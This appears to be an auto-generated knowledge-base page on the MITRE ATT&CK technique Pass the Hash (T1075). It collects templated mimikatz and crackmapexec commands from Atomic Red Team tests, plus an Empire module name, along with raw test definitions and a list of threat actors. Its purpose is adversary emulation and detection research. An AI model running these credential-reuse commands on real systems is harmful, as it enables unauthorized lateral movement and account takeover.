
# Pass the Hash

## Description

### MITRE Description

> Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash. In this technique, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems. 

Windows 7 and higher with KB2871997 require valid domain user credentials or RID 500 administrator hashes. (Citation: NSA Spotting)

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: intentionally left blank
* Permissions: None
* Platforms: ['Windows']
* Remote: intentionally left blank
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1075

## Potential Commands

```
mimikatz # sekurlsa::pth /user:Administrator /domain:#{domain} /ntlm:#{ntlm}

mimikatz # sekurlsa::pth /user:#{user_name} /domain:atomic.local /ntlm:#{ntlm}

mimikatz # sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:cc36cf7a8514893efccd3324464tkg1a

crackmapexec #{domain} -u Administrator -H #{ntlm} -x #{command} 

crackmapexec atomic.local -u #{user_name} -H #{ntlm} -x #{command} 

crackmapexec #{domain} -u #{user_name} -H cc36cf7a8514893efccd3324464tkg1a -x #{command} 

crackmapexec #{domain} -u #{user_name} -H #{ntlm} -x whoami 

crackmapexec #{domain} -u #{user_name} -H #{ntlm} -x #{command} 

powershell/credentials/mimikatz/pth
powershell/credentials/mimikatz/pth
```

## Commands Dataset

```
[{'command': 'mimikatz # sekurlsa::pth /user:Administrator /domain:#{domain} '
             '/ntlm:#{ntlm}\n',
  'name': None,
  'source': 'atomics/T1075/T1075.yaml'},
 {'command': 'mimikatz # sekurlsa::pth /user:#{user_name} /domain:atomic.local '
             '/ntlm:#{ntlm}\n',
  'name': None,
  'source': 'atomics/T1075/T1075.yaml'},
 {'command': 'mimikatz # sekurlsa::pth /user:#{user_name} /domain:#{domain} '
             '/ntlm:cc36cf7a8514893efccd3324464tkg1a\n',
  'name': None,
  'source': 'atomics/T1075/T1075.yaml'},
 {'command': 'crackmapexec #{domain} -u Administrator -H #{ntlm} -x '
             '#{command} \n',
  'name': None,
  'source': 'atomics/T1075/T1075.yaml'},
 {'command': 'crackmapexec atomic.local -u #{user_name} -H #{ntlm} -x '
             '#{command} \n',
  'name': None,
  'source': 'atomics/T1075/T1075.yaml'},
 {'command': 'crackmapexec #{domain} -u #{user_name} -H '
             'cc36cf7a8514893efccd3324464tkg1a -x #{command} \n',
  'name': None,
  'source': 'atomics/T1075/T1075.yaml'},
 {'command': 'crackmapexec #{domain} -u #{user_name} -H #{ntlm} -x whoami \n',
  'name': None,
  'source': 'atomics/T1075/T1075.yaml'},
 {'command': 'crackmapexec #{domain} -u #{user_name} -H #{ntlm} -x '
             '#{command} \n',
  'name': None,
  'source': 'atomics/T1075/T1075.yaml'},
 {'command': 'powershell/credentials/mimikatz/pth',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/pth',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Pass the Hash': {'atomic_tests': [{'description': 'Note: '
                                                                            'must '
                                                                            'dump '
                                                                            'hashes '
                                                                            'first\n'
                                                                            '[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)\n',
                                                             'executor': {'command': 'mimikatz '
                                                                                     '# '
                                                                                     'sekurlsa::pth '
                                                                                     '/user:#{user_name} '
                                                                                     '/domain:#{domain} '
                                                                                     '/ntlm:#{ntlm}\n',
                                                                          'name': 'command_prompt'},
                                                             'input_arguments': {'domain': {'default': 'atomic.local',
                                                                                            'description': 'domain',
                                                                                            'type': 'string'},
                                                                                 'ntlm': {'default': 'cc36cf7a8514893efccd3324464tkg1a',
                                                                                          'description': 'ntlm '
                                                                                                         'hash',
                                                                                          'type': 'string'},
                                                                                 'user_name': {'default': 'Administrator',
                                                                                               'description': 'username',
                                                                                               'type': 'string'}},
                                                             'name': 'Mimikatz '
                                                                     'Pass the '
                                                                     'Hash',
                                                             'supported_platforms': ['windows']},
                                                            {'dependencies': [{'description': 'CrackMapExec '
                                                                                              'executor '
                                                                                              'must '
                                                                                              'exist '
                                                                                              'on '
                                                                                              'disk '
                                                                                              'at '
                                                                                              'specified '
                                                                                              'location '
                                                                                              '(#{crackmapexec_exe})\n',
                                                                               'get_prereq_command': 'Write-Host '
                                                                                                     'Automated '
                                                                                                     'installer '
                                                                                                     'not '
                                                                                                     'implemented '
                                                                                                     'yet, '
                                                                                                     'please '
                                                                                                     'install '
                                                                                                     'crackmapexec '
                                                                                                     'manually '
                                                                                                     'at '
                                                                                                     'this '
                                                                                                     'location: '
                                                                                                     '#{crackmapexec_exe}\n',
                                                                               'prereq_command': 'if(Test-Path '
                                                                                                 '#{crackmapexec_exe}) '
                                                                                                 '{ '
                                                                                                 '0 '
                                                                                                 '} '
                                                                                                 'else '
                                                                                                 '{ '
                                                                                                 '-1 '
                                                                                                 '}\n'}],
                                                             'dependency_executor_name': 'powershell',
                                                             'description': 'command '
                                                                            'execute '
                                                                            'with '
                                                                            'crackmapexec\n',
                                                             'executor': {'command': 'crackmapexec '
                                                                                     '#{domain} '
                                                                                     '-u '
                                                                                     '#{user_name} '
                                                                                     '-H '
                                                                                     '#{ntlm} '
                                                                                     '-x '
                                                                                     '#{command} \n',
                                                                          'elevation_required': False,
                                                                          'name': 'command_prompt'},
                                                             'input_arguments': {'command': {'default': 'whoami',
                                                                                             'description': 'command '
                                                                                                            'to '
                                                                                                            'execute',
                                                                                             'type': 'string'},
                                                                                 'crackmapexec_exe': {'default': 'C:\\CrackMapExecWin\\crackmapexec.exe',
                                                                                                      'description': 'crackmapexec '
                                                                                                                     'windows '
                                                                                                                     'executable',
                                                                                                      'type': 'Path'},
                                                                                 'domain': {'default': 'atomic.local',
                                                                                            'description': 'domain',
                                                                                            'type': 'string'},
                                                                                 'ntlm': {'default': 'cc36cf7a8514893efccd3324464tkg1a',
                                                                                          'description': 'command',
                                                                                          'type': 'string'},
                                                                                 'user_name': {'default': 'Administrator',
                                                                                               'description': 'username',
                                                                                               'type': 'string'}},
                                                             'name': 'crackmapexec '
                                                                     'Pass the '
                                                                     'Hash',
                                                             'supported_platforms': ['windows']}],
                                           'attack_technique': 'T1075',
                                           'display_name': 'Pass the Hash'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1075',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/credentials/mimikatz/pth":  '
                                                                                 '["T1075"],',
                                            'Empire Module': 'powershell/credentials/mimikatz/pth',
                                            'Technique': 'Pass the Hash'}}]
```

# Tactics


* [Lateral Movement](../tactics/Lateral-Movement.md)


# Mitigations

None

# Actors


* [APT32](../actors/APT32.md)

* [APT28](../actors/APT28.md)
    
* [APT1](../actors/APT1.md)
    
* [Night Dragon](../actors/Night-Dragon.md)
    
* [Soft Cell](../actors/Soft-Cell.md)
    
